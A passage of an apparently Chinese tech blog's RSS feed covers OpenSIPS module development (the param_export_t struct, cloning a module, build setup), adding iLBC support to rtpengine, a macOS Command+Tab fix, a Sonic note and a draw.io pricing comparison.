&lt;h2 id=&#34;param_export_t&#34;&gt;param_export_t&lt;/h2&gt;
&lt;p&gt;param_export_t这个结构体是用来通过脚本里面的modparam向模块传递参数的。这个数组最后一向是&lt;code&gt;{0,0,0}&lt;/code&gt; 这最后一项其实是个标志，标志着数组的结束。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;static param_export_t params&lt;span style=&#34;color:#f92672&#34;&gt;[]={&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;max_limit&amp;#34;&lt;/span&gt;,    INT_PARAM,  &amp;amp;max_limit&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local_zone_code&amp;#34;&lt;/span&gt;, STR_PARAM,  &amp;amp;local_zone_code.s&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;0,0,0&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在sr_module_deps.h和sr_module.h中有下面的代码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;typedef struct param_export_ param_export_t;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;param_export_t实际上是指向param_export_这个结构体。&lt;/p&gt;
&lt;p&gt;这个结构体有三个参数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;name 表示参数的名称&lt;/li&gt;
&lt;li&gt;modparam_t 表示参数的类型。参数类型有以下几种
&lt;ul&gt;
&lt;li&gt;STR_PARAM 字符串类型&lt;/li&gt;
&lt;li&gt;INT_PARAM 整数类型&lt;/li&gt;
&lt;li&gt;USE_FUNC_PARAM 函数类型&lt;/li&gt;
&lt;li&gt;PARAM_TYPE_MASK 这个用到的时候再说&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;param_pointer 是一个指针，用到的时候再具体说明&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  struct param_export_ &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      char* name;             /*!&amp;lt; null terminated param. name */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      modparam_t type;        /*!&amp;lt; param. type */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      void* param_pointer;    /*!&amp;lt; pointer to the param. memory location */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;#define STR_PARAM        (1U&amp;lt;&amp;lt;0)  /* String parameter type */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;#define INT_PARAM        (1U&amp;lt;&amp;lt;1)  /* Integer parameter type */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;#define USE_FUNC_PARAM   (1U&amp;lt;&amp;lt;(8*sizeof(int)-1))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;#define PARAM_TYPE_MASK(_x)   ((_x)&amp;amp;(~USE_FUNC_PARAM))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  typedef unsigned int modparam_t;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;回过头来，看看local_zone_code这个参数的配置，是不是就非常明确了呀&lt;/p&gt;</description>
    </item>
    <item>
      <title>ch3 复制并裁剪一个模块</title>
      <link>https://wdd.js.org/opensips/module-dev/l3/</link>
      <pubDate>Tue, 20 Apr 2021 13:53:41 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/module-dev/l3/</guid>
      <description>&lt;p&gt;从头写一个模块是比较麻烦的，我们可以基于一个简单的模块，然后在这个模块上进行一些修改。&lt;/p&gt;
&lt;p&gt;我们基于maxfwd这个模块，复制一个模块，叫做home_location。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;为什么叫做home_location呢？因为我想根据一个手机号，查出它的归属地，然后根据当地的归属地，判断号码前要不要加0&lt;/p&gt;&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd modules
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cp -R maxfwd home_location
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;➜  home_location git:&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;home_location&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; ✗ ll
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;total 300K
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; root root 4.0K Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; 13:56 doc
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root  &lt;span style=&#34;color:#ae81ff&#34;&gt;217&lt;/span&gt; Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; 14:00 Makefile
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root 4.7K Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; 14:00 maxfwd.c
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root 2.0K Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; 13:56 maxfwd.d
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root  77K Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; 13:56 maxfwd.o
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root  93K Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; 13:56 maxfwd.so
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root 4.0K Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; 13:56 mf_funcs.c
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root 2.1K Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; 13:56 mf_funcs.d
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root 1.2K Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; 13:56 mf_funcs.h
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root  84K Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; 13:56 mf_funcs.o
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root 7.0K Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; 13:56 README
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;下面的操作都是操作home_location目录下的文件。&lt;/p&gt;</description>
    </item>
    <item>
      <title>ch2 初始化环境</title>
      <link>https://wdd.js.org/opensips/module-dev/l2/</link>
      <pubDate>Tue, 20 Apr 2021 13:29:47 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/module-dev/l2/</guid>
      <description>&lt;h1 id=&#34;环境说明&#34;&gt;环境说明&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;ubuntu 20.04&lt;/li&gt;
&lt;li&gt;opensips 2.4&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;克隆仓库&#34;&gt;克隆仓库&lt;/h1&gt;
&lt;p&gt;由于github官方的仓库clone太慢，最好选择从国内的gitee上克隆。&lt;/p&gt;
&lt;p&gt;下面的gfo, gco, gl, gcb都是oh-my-zsh中git插件的快捷键。建议你要么安装oh-my-zsh, 或者也可以看看这些快捷方式对应的底层命令是什么 &lt;a href=&#34;https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/git&#34;&gt;https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/git&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git clone https://gitee.com/wangduanduan/opensips.git
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;gfo 2.4:2.4
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;gco 2.4
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;gl
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;gcb home_location &lt;span style=&#34;color:#75715e&#34;&gt;#基于2.4分支创建home_location分支&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;安装依赖&#34;&gt;安装依赖&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt update
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt install -y build-essential bison flex m4 pkg-config libncurses5-dev &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;rsyslog libmysqlclient-dev &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;libssl-dev mysql-client libmicrohttpd-dev libcurl4-openssl-dev uuid-dev &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;libpcre3-dev libconfuse-dev libxml2-dev libhiredis-dev
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;编译安装&#34;&gt;编译安装&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;make all -j4 include_modules&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mysql&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;make install include_modules&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mysql&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;测试&#34;&gt;测试&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;➜  opensips git:&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;home_location&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; opensips -V
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;version: opensips 2.4.9 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;x86_64/linux&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flags: STATS: On, DISABLE_NAGLE, USE_MCAST, SHM_MMAP, PKG_MALLOC, F_MALLOC, FAST_LOCK-ADAPTIVE_WAIT
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ADAPTIVE_WAIT_LOOPS&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1024, MAX_RECV_BUFFER_SIZE 262144, MAX_LISTEN 16, MAX_URI_SIZE 1024, BUF_SIZE &lt;span style=&#34;color:#ae81ff&#34;&gt;65535&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;poll method support: poll, epoll, sigio_rt, &lt;span style=&#34;color:#66d9ef&#34;&gt;select&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git revision: 9c2c8638e
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;main.c compiled on 13:49:33 Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2021&lt;/span&gt; with gcc &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>learn Sonic</title>
      <link>https://wdd.js.org/posts/2021/04/kvg1r9/</link>
      <pubDate>Tue, 20 Apr 2021 08:47:29 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/04/kvg1r9/</guid>
      <description>&lt;h1 id=&#34;intro&#34;&gt;Intro&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Sonic is a fast, lightweight and schema-less search backend. It ingests search texts and identifier tuples that can then be queried against in a microsecond&amp;rsquo;s time.&lt;/strong&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;h1 id=&#34;install&#34;&gt;install&lt;/h1&gt;
&lt;h1 id=&#34;ref&#34;&gt;ref&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/valeriansaliou/sonic&#34;&gt;https://github.com/valeriansaliou/sonic&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://crates.io/crates/sonic-server&#34;&gt;https://crates.io/crates/sonic-server&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>command &#43; tab 无法切换窗口了？</title>
      <link>https://wdd.js.org/posts/2021/04/gt9iss/</link>
      <pubDate>Mon, 19 Apr 2021 17:41:14 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/04/gt9iss/</guid>
      <description>&lt;p&gt;今天发现一个问题，按住command + tab, 已经切换到对应的应用图标上，但是松开按键之后，屏幕并没有切换到新的App屏幕上。特别是那些全屏的应用。&lt;/p&gt;
&lt;p&gt;看了很多资料，都是没啥用的，最后发现&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://apple.stackexchange.com/questions/112350/cmdtab-does-not-work-on-hidden-or-minimized-windows&#34;&gt;https://apple.stackexchange.com/questions/112350/cmdtab-does-not-work-on-hidden-or-minimized-windows&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最终发现，需要设置调度中心的 &lt;code&gt;切换到某个应用时，会切换到包含该应用程序的打开的窗口空间&lt;/code&gt;， 这个必需要勾选。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2021/04/gt9iss/2022-10-29-19-54-33.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>rtpengine 增加对ilbc编解码的支持</title>
      <link>https://wdd.js.org/opensips/ch9/rtpengine-ilbc/</link>
      <pubDate>Sun, 18 Apr 2021 21:28:20 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch9/rtpengine-ilbc/</guid>
      <description>&lt;p&gt;ilbc的编码特定是占用带宽小，并且抗丢表。但是rtpengine是不支持ilbc编码的，可以参考的资料有以下两个&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/sipwise/rtpengine/issues/897&#34;&gt;https://github.com/sipwise/rtpengine/issues/897&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://sr-users.sip-router.narkive.com/f3jhDeyU/rtpengine-and-ilbc-support&#34;&gt;https://sr-users.sip-router.narkive.com/f3jhDeyU/rtpengine-and-ilbc-support&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用&lt;code&gt;rtpengine --codecs&lt;/code&gt;可以打印出rtpengine支持的编解码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rtpengine --codecs
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PCMA: fully supported
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PCMU: fully supported
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;G723: fully supported
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;G722: fully supported
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;QCELP: supported &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; decoding only
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;G729: supported &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; decoding only
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;speex: fully supported
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GSM: fully supported
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;iLBC: not supported
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;opus: fully supported
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vorbis: fully supported
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ac3: fully supported
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;eac3: fully supported
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ATRAC3: supported &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; decoding only
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ATRAC-X: supported &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; decoding only
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;AMR: fully supported
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;AMR-WB: fully supported
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PCM-S16LE: fully supported
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;MP3: fully supported
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;下面的操作基于debian:9-slim的基础镜像构建的，在构建rtpengine之前，我们先编译ilbc的依赖库&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RUN echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;deb http://www.deb-multimedia.org stretch main&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/apt/sources.list &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt-get update &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt-get install deb-multimedia-keyring -y --allow-unauthenticated &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt-get install libilbc-dev libavcodec-dev libilbc2 -y --allow-unauthenticated
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;安装以来之后，继续构建rtpengine, rtpengine构建完之后，执行&lt;code&gt;rtpengine --codecs&lt;/code&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>draw.io居然有桌面客户端了</title>
      <link>https://wdd.js.org/posts/2021/04/zf3xgd/</link>
      <pubDate>Fri, 09 Apr 2021 21:03:21 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/04/zf3xgd/</guid>
      <description>&lt;p&gt;当你需要解释一个概念的时候，图形化的展示是最容易让人理解的方式。&lt;/p&gt;
&lt;p&gt;以前我一直用&lt;a href=&#34;https://www.processon.com/diagrams&#34;&gt;processon&lt;/a&gt;来绘制， processon的优点很多，用过的都知道。&lt;/p&gt;
&lt;p&gt;但是缺点也是非常明显的。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;定价过高&lt;/li&gt;
&lt;li&gt;不支持离线使用&lt;/li&gt;
&lt;li&gt;虽然processon的使用体验还不错，但是对我个人来说，使用的频率并不高&lt;/li&gt;
&lt;li&gt;免费的会员最多只有19个文件可以使用&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;有一年，我的文件超过了19个，我就只能买会员了。会员到期后，我就没有续费，因为使用的频率太低。&lt;/p&gt;
&lt;h1 id=&#34;关于processon定价&#34;&gt;关于processon定价&lt;/h1&gt;
&lt;p&gt;我们横向对比一下几个互联网产品的收费标准， 从下表可以看出，Processon的定价不菲。&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;项目&lt;/th&gt;
          &lt;th&gt;收费标准&lt;/th&gt;
          &lt;th&gt;最低年费用&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;processon&lt;/td&gt;
          &lt;td&gt;升级到个人版 159/年&lt;/td&gt;
          &lt;td&gt;159&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;语雀会员&lt;/td&gt;
          &lt;td&gt;标准99 限时特惠69/年&lt;/td&gt;
          &lt;td&gt;69&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;印象笔记&lt;/td&gt;
